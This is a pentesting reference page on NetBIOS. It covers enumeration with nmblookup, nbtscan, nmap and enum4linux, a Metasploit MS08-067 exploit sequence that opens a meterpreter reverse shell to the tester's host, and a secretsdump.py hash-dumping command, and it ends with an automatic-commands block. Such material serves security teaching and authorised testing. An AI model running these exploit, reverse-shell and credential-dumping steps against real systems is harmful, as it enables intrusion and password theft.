# 137,138,139 - Pentesting NetBios

## NetBios Name Service

**NetBIOS Name Service** plays a crucial role, involving various services such as **name registration and resolution**, **datagram distribution**, and **session services**, utilizing specific ports for each service.
NetBIOS (Network Basic Input/Output System) is a protocol used for communication within a local network. It allows applications on different computers to communicate over a local area network (LAN), primarily used in early Windows-based networks for name resolution and sharing services like files and printers. Though its usage has decreased over time with the introduction of more secure and scalable solutions, some networks might still have devices using NetBIOS, potentially exposing them to cybersecurity risks.

* Name service for name registration and resolution (ports: 137/udp and 137/tcp).
* Datagram distribution service for connectionless communication (port: 138/udp).
* Session service for connection-oriented communication (port: 139/tcp).

### Name Service

For a device to participate in a NetBIOS network, it must have a unique name. This is achieved through a **broadcast process** where a "Name Query" packet is sent. If no objections are received, the name is considered available. Alternatively, a **Name Service server** can be queried directly to check for name availability or to resolve a name to an IP address. Tools like `nmblookup`, `nbtscan`, and `nmap` are utilized for enumerating NetBIOS services, revealing server names and MAC addresses.

```bash
PORT    STATE SERVICE    VERSION
137/udp open  netbios-ns Samba nmbd netbios-ns (workgroup: WORKGROUP)
```

Enumerating a NetBIOS service you can obtain the names the server is using and the MAC address of the server.

```bash
nmblookup -A <IP>
nbtscan <IP>/30
sudo nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n <IP>
nmap -p 137,138,139 X.X.X.X
```
## Enumeration
### NetBIOS Name Service
NetBIOS operates primarily on ports 137/udp for name services, 138/udp for datagram distribution, and 139/tcp for session services. The name service component is crucial for translating human-friendly computer names within the network into their corresponding IP addresses.

To explore the network and find available NetBIOS names, use the following commands:
```
nmblookup -A <IP>

nbtscan <IP>/30

sudo nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n <IP>
```
## Enumerating Shares and Sessions
enum4linux
`enum4linux` is a tool for enumerating information from Windows and Samba systems.
```
enum4linux -a X.X.X.X
```
This command attempts to retrieve as much information as possible including shares, sessions, and usernames.

## Attack Vectors
### Exploiting Known Vulnerabilities
Some well-known vulnerabilities might be present in NetBIOS services, depending on the system's configuration and patch level.

**MS08-067**
MS08-067 is a critical vulnerability in Microsoft Server Message Block (SMB) that could allow remote code execution.
```
msfconsole
use exploit/windows/smb/ms08_067_netapi
set RHOST <target-ip>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your-ip>
exploit
```
# Post-Exploitation
### Dumping Hashes
Dump the SAM database hashes using secretsdump.py from Impacket suite:
```
secretsdump.py -just-dc <domain>/<user>@<target-ip>
```
## HackTricks Automatic Commands

```
Protocol_Name: Netbios    #Protocol Abbreviation if there is one.
Port_Number:  137,138,139     #Comma separated if there is more than one.
Protocol_Description: Netbios         #Protocol Abbreviation Spelled out

Entry_1:
  Name: Notes
  Description: Notes for NetBios
  Note: |
    Name service for name registration and resolution (ports: 137/udp and 137/tcp).
    Datagram distribution service for connectionless communication (port: 138/udp).
    Session service for connection-oriented communication (port: 139/tcp).

    For a device to participate in a NetBIOS network, it must have a unique name. This is achieved through a broadcast process where a "Name Query" packet is sent. If no objections are received, the name is considered available. Alternatively, a Name Service server can be queried directly to check for name availability or to resolve a name to an IP address.

    https://book.hacktricks.xyz/pentesting/137-138-139-pentesting-netbios

Entry_2:
  Name: Find Names
  Description: Three scans to find the names of the server
  Command: nmblookup -A {IP} &&&& nbtscan {IP}/30 &&&& nmap -sU -sV -T4 --script nbstat.nse -p 137 -Pn -n {IP}
```
